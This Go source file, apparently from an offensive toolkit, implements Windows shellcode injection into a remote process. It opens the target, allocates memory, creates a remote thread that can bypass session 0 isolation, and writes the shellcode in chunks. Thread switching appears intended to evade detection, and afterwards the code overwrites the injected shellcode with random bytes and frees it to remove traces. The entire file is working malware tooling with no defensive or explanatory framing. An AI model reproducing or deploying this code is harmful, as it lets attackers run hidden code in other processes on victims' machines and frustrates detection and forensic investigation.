// +build windows

package injector

import (
	"context"
	"time"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/module/windows/api"
	"project/internal/random"
	"project/internal/security"
)

// InjectShellcode is used to inject shellcode to a process, it will block until execute finish.
// chunkSize is the shellcode size that will be write by call WriteProcessMemory once.
// if session0 is true, it will use ZwCreateThreadEx for bypass session isolation.
// [Warning]: shellcode slice will be covered.
func InjectShellcode(pid uint32, shellcode []byte, chunkSize int, session0, wait, clean bool) error {
	defer security.CoverBytes(shellcode)
	// ------------------------------------create remote thread------------------------------------
	// open target process
	doneOP := security.SwitchThreadAsync()
	const da = windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION |
		windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ
	hProcess, err := api.OpenProcess(da, false, pid)
	if err != nil {
		return err
	}
	var processHandleClosed bool
	defer func() {
		if !processHandleClosed {
			api.CloseHandle(hProcess)
		}
	}()
	// alloc memory for shellcode
	doneVA := security.SwitchThreadAsync()
	size := uintptr(len(shellcode))
	const memType = windows.MEM_COMMIT | windows.MEM_RESERVE
	memAddr, err := api.VirtualAllocEx(hProcess, 0, size, memType, windows.PAGE_NOACCESS)
	if err != nil {
		return err
	}
	// create remote thread first and suspend
	doneCRT := security.SwitchThreadAsync()
	var hThread windows.Handle
	if session0 {
		const creationFlags = 1 // resume thread
		hThread, err = api.ZwCreateThreadEx(hProcess, nil, 0, memAddr, nil, creationFlags)
	} else {
		const creationFlags = windows.CREATE_SUSPENDED
		hThread, _, err = api.CreateRemoteThread(hProcess, nil, 0, memAddr, nil, creationFlags)
	}
	if err != nil {
		return err
	}
	var threadHandleClosed bool
	defer func() {
		if !threadHandleClosed {
			api.CloseHandle(hThread)
		}
	}()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	security.WaitSwitchThreadAsync(ctx, doneOP, doneVA, doneCRT)
	// --------------------------------------write shellcode---------------------------------------
	if chunkSize < 1 {
		chunkSize = 4
	}
	mw := memWriter{
		hProcess:  hProcess,
		memAddr:   memAddr,
		memory:    shellcode,
		size:      size,
		chunkSize: chunkSize,
	}
	err = mw.Write()
	if err != nil {
		return err
	}
	security.CoverBytes(shellcode)
	// -------------------------------------execute shellcode--------------------------------------
	for i := 0; i < 5; i++ {
		security.SwitchThread()
	}
	_, err = windows.ResumeThread(hThread)
	if err != nil {
		return errors.Wrap(err, "failed to resume thread")
	}
	// close process handle at once and reopen after execute finish
	security.SwitchThread()
	api.CloseHandle(hProcess)
	processHandleClosed = true
	if wait { // wait thread for wait shellcode execute finish
		security.SwitchThread()
		_, err = windows.WaitForSingleObject(hThread, windows.INFINITE)
		if err != nil {
			return errors.Wrap(err, "failed to wait thread")
		}
	}
	// close thread handle at once
	security.SwitchThread()
	api.CloseHandle(hThread)
	threadHandleClosed = true
	// clean shellcode
	if wait && clean {
		return cleanShellcode(pid, memAddr, size)
	}
	return nil
}

// cleanShellcode is used to clean shellcode and free allocated memory.
func cleanShellcode(pid uint32, memAddr uintptr, size uintptr) error {
	// reopen target process, maybe failed like process is terminated
	doneOP := security.SwitchThreadAsync()
	const da = windows.PROCESS_QUERY_INFORMATION | windows.PROCESS_VM_OPERATION |
		windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ
	hProcess, err := api.OpenProcess(da, false, pid)
	if err != nil {
		return err
	}
	defer api.CloseHandle(hProcess)
	// clean shellcode and free it
	doneVP := security.SwitchThreadAsync()
	old := new(uint32)
	err = api.VirtualProtectEx(hProcess, memAddr, size, windows.PAGE_READWRITE, old)
	if err != nil {
		return err
	}
	// cover raw shellcode
	doneWPM := security.SwitchThreadAsync()
	rand := random.NewRand()
	_, err = api.WriteProcessMemory(hProcess, memAddr, rand.Bytes(int(size)))
	if err != nil {
		return errors.WithMessage(err, "failed to cover shellcode to target process")
	}
	// free memory
	doneVF := security.SwitchThreadAsync()
	err = api.VirtualFreeEx(hProcess, memAddr, 0, windows.MEM_RELEASE)
	if err != nil {
		return errors.Wrap(err, "failed to release covered memory")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	security.WaitSwitchThreadAsync(ctx, doneOP, doneVP, doneWPM, doneVF)
	return nil
}
